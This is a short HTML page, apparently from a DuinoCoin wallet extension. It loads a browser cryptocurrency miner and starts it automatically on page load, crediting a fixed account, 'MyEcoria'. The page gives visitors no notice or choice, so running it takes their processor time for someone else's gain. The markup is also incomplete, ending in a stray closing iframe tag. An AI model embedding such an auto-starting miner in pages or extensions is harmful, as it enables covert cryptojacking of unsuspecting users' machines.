<!DOCTYPE html>
<html>
  <head>
    <title>DuinoCoin</title>
    <link rel="stylesheet" href="css/style.css" />
    <script src="duino-js.min.js"></script> <!--imports the Duino-JS miner-->
    <script>
        username = "MyEcoria"; //put your username here (e.g. revox, ericddm, snehaislove or Hoiboy19), the default is Hoiboy19.
        rigid = "DuinoCoin Wallet Extension"; //If you want to change the rig ID, you can change this. If you want to keep using "Duino-JS", you can remove this line.

        startMiner(); //starts the miner
    </script>

  </head>

    </iframe>
